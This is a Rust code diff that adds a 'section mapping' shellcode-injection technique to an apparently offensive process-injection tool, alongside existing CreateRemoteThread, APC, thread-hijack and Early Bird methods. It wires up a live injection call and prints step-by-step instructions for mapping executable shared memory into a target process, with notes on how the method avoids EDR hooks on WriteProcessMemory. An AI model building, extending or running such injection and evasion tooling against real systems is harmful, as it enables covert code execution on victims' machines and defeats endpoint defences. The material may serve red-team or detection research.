@@ -3,6 +3,7 @@ mod common;
 pub mod crt;
 pub mod earlybird;
 pub mod hijack;
+pub mod section;
 pub mod wrappers;
 
 use crate::log::LogSink;
@@ -15,6 +16,7 @@ pub enum InjectionTechnique {
     APC,
     ThreadHijack,
     EarlyBird,
+    SectionMapping,
 }
 
 impl InjectionTechnique {
@@ -27,6 +29,9 @@ impl InjectionTechnique {
                 Some(Self::ThreadHijack)
             }
             "earlybird" | "early_bird" | "early-bird" => Some(Self::EarlyBird),
+            "section" | "sectionmapping" | "mapview" | "ntmapviewofsection" => {
+                Some(Self::SectionMapping)
+            }
             _ => None,
         }
     }
@@ -37,6 +42,7 @@ impl InjectionTechnique {
             Self::APC => "APC Injection",
             Self::ThreadHijack => "Thread Hijack (SetThreadContext)",
             Self::EarlyBird => "Early Bird APC",
+            Self::SectionMapping => "Section Mapping (MapViewOfFile)",
         }
     }
 }
@@ -113,10 +119,25 @@ pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
                 log.warning("    - Process creation itself is monitored");
                 log.warning("    - Key advantage: runs before user-mode hooks install");
             }
+            InjectionTechnique::SectionMapping => {
+                log.detail("  Steps:");
+                log.detail("    1. CreateFileMappingW — anonymous shared section (PAGE_EXECUTE_READWRITE)");
+                log.detail("    2. MapViewOfFile — map section into local process (writable)");
+                log.detail("    3. memcpy — write shellcode to local view (no WriteProcessMemory!)");
+                log.detail("    4. MapViewOfFileNuma2 — map same section into target (PAGE_EXECUTE_READ)");
+                log.detail("    5. CreateRemoteThread — execute shellcode in target");
+                log.detail("    6. WaitForSingleObject — wait for completion");
+                log.info("");
+                log.warning("  Detection:");
+                log.warning("    - WriteProcessMemory is NEVER called — bypasses hooks on it");
+                log.warning("    - Shared section creation + cross-process mapping is monitored");
+                log.warning("    - CreateRemoteThread is still used for execution");
+                log.warning("    - Key advantage: memory write happens locally, not cross-process");
+            }
         }
     } else {
         log.error(format!("  Unknown technique: {}", technique));
-        log.info("  Known techniques: createremote, apc, hijack, earlybird");
+        log.info("  Known techniques: createremote, apc, hijack, earlybird, section");
     }
 }
 
@@ -151,6 +172,12 @@ pub fn print_info(log: &LogSink) {
     log.detail("     - Queue APC to main thread BEFORE it starts");
     log.detail("     - APC fires during process initialization, before EDR hooks");
     log.warning("     - CREATE_SUSPENDED + APC pattern is increasingly detected");
+    log.info("");
+    log.info("  5. Section Mapping (MapViewOfFile)");
+    log.detail("     - Create shared memory section, map locally, write shellcode");
+    log.detail("     - Map same section into target — no WriteProcessMemory");
+    log.detail("     - Execute via CreateRemoteThread");
+    log.warning("     - Bypasses WriteProcessMemory hooks, but CRT is still visible");
     log.info("");
     log.warning("Detection considerations:");
     log.warning("  - All these techniques are WELL KNOWN to EDR vendors");
@@ -190,6 +217,7 @@ pub fn live_inject(
         InjectionTechnique::EarlyBird => {
             earlybird::live_inject(shellcode, "C:\\Windows\\System32\\notepad.exe", log)
         }
+        InjectionTechnique::SectionMapping => section::live_inject(pid, shellcode, log),
     }
 }
 
@@ -219,7 +247,7 @@ pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, lo
                 "ERROR: unknown injection technique '{}'",
                 technique_name
             ));
-            log.info("Known techniques: createremote, apc, hijack, earlybird");
+            log.info("Known techniques: createremote, apc, hijack, earlybird, section");
             return;
         }
     };
